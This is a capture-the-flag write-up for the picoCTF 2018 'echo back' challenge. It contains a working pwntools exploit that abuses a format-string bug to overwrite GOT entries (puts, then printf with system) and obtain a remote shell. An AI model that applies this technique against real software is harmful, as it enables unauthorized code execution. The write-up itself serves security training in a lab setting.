echo back - Points: 500
===========

## Description

>This program we found seems to have a vulnerability. Can you get a shell and retreive the flag? Connect to it with nc 2018shell1.picoctf.com 26532

## Hint:

> * hmm, printf seems to be dangerous...
> * You may need to modify more than one address at once.
> * Ever heard of the Global Offset Table?

## Useful Information

$readelf -r echo_back|grep "puts\|printf\|system" && nm echo_back|grep vuln
0804a010  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a01c  00000507 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
0804a020  00000607 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
080485ab T vuln

Format String Bug detected :exclamation:

## Exploit

# **REQUIRE** :[Pwntools Python](https://github.com/Gallopsled/pwntools)

> 1.Loop in the vuln() for reuse FS Bug (Overwrite GOT puts with vuln address) 
> 2.Leak address of system (Read Got address of System with "%s")
> 3.Write in a function the leaked address of system in a GOT Entry of printf(read will not work)


```python
#!/usr/bin/python2.7
from pwn import *
import time,sys

puts=0x804a01c
printf=0x804a010
sys=0x804a020
vuln_l=(0x80485ab&0x0000ffff)
vuln_h=(0x80485ab>>16)
rem = remote("2018shell3.picoctf.com",26532)

rem.recv()
payload=p32(puts+2)+p32(puts)+p32(sys)+"%"+"%dx" % (vuln_h-12)+"%7$hn"+"%"+"%dx" % (vuln_l-vuln_h)+"%8$hn#%9$sX"
rem.sendline(payload)
sys=int(rem.recvuntil("X").split("#")[1][:4][::-1].encode("hex"),16)
sys_l=sys&0x0000ffff
sys_h=sys>>16
payload=p32(printf)+p32(printf+2)+"%"+"%dx" % (sys_l-8)+"%7$hn"+"%"+"%dx" % (sys_h-sys_l)+"%8$hn"
rem.sendline(payload)
rem.interactive()
rem.close()

```


